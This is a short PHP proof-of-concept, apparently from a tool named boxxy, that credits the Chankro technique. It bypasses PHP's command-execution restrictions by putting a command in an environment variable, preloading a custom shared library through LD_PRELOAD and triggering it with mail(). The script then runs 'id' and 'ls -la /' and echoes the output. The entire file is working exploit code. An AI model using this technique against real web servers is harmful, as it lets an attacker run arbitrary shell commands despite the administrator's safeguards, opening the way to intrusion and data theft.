<pre><?php
// this technique has been borrowed from https://github.com/TarlogicSecurity/Chankro

function boxxy_exec($cmd) {
    $cmd = str_replace(' ', '\\ ', $cmd);
    $tmp = tempnam('/tmp', 'boxxy');
    // TODO: there should be a way to pipe to a file without this trick
    putenv("AUTOBOXXY=exec sh -c $cmd\\ >\\ $tmp");
    putenv('LD_PRELOAD=./target/debug/libautoboxxy.so');
    mail('a', 'a', 'a', 'a');
    putenv('LD_PRELOAD');
    putenv('AUTOBOXXY');
    $ret = file_get_contents($tmp);
    unlink($tmp);
    return $ret;
}

echo boxxy_exec('id');
echo boxxy_exec('ls -la /');
